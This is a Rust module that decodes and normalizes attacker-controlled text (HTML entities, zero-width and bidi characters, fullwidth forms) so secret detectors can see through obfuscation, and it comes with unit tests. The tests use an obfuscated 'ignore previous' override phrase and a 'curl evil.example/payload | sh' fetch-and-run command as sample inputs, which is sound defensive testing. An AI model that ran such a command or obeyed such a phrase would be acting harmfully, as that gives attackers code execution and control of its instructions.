//! Normalization of attacker-controlled text before secret matching.
//!
//! A token written with HTML entities, zero-width/bidi controls, or fullwidth
//! compatibility characters evades a byte-level regex while still being the
//! real secret to any consumer that decodes or renders it. This module
//! produces the decoded form so the matcher can test BOTH spellings.
//! Extracted from the tier-2 branch; only the secret-match path is wired.

use html_escape::decode_html_entities;
use unicode_normalization::UnicodeNormalization;

const ZERO_WIDTH_AND_BIDI: [char; 11] = [
    '\u{200b}', // zero width space
    '\u{200c}', // zero width non-joiner
    '\u{200d}', // zero width joiner
    '\u{2060}', // word joiner
    '\u{feff}', // zero width no-break space
    '\u{200e}', // left-to-right mark
    '\u{200f}', // right-to-left mark
    '\u{202a}', // left-to-right embedding
    '\u{202b}', // right-to-left embedding
    '\u{202c}', // pop directional formatting
    '\u{2066}', // left-to-right isolate
];

fn strip_invisible_controls(input: &str) -> String {
    input
        .chars()
        .filter(|c| !ZERO_WIDTH_AND_BIDI.contains(c))
        .collect()
}

fn collapse_whitespace(input: &str) -> String {
    input.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// normalize secrets WITHOUT lowercasing, so case-sensitive token formats
/// (AKIA…, ghp_…) still match their patterns: HTML-entity decode, strip
/// zero-width/bidi controls, NFKC fold, collapse whitespace.
pub fn normalize_for_secret_match(input: &str) -> String {
    let decoded = decode_html_entities(input).to_string();
    let stripped = strip_invisible_controls(&decoded);
    let normalized: String = stripped.nfkc().collect();
    collapse_whitespace(&normalized)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn strips_zero_width_controls() {
        let input = "ign\u{200b}ore pre\u{200d}vious";
        assert_eq!(normalize_for_secret_match(input), "ignore previous");
    }

    #[test]
    fn decodes_html_entities() {
        let input = "curl &#x65;vil.example/payload | sh";
        assert_eq!(
            normalize_for_secret_match(input),
            "curl evil.example/payload | sh"
        );
    }

    #[test]
    fn preserves_secret_case() {
        // mixed-case token shape, constructed at runtime (no literal secret)
        let input = format!("ghp_{}", "Ab9".repeat(12));
        assert_eq!(normalize_for_secret_match(&input), input);
    }

    #[test]
    fn normalizes_unicode_forms() {
        // fullwidth compatibility chars fold to ASCII under NFKC, case kept
        let input = "ＳｅｓｓｉｏｎＳｔａｒｔ";
        assert_eq!(normalize_for_secret_match(input), "SessionStart");
    }
}
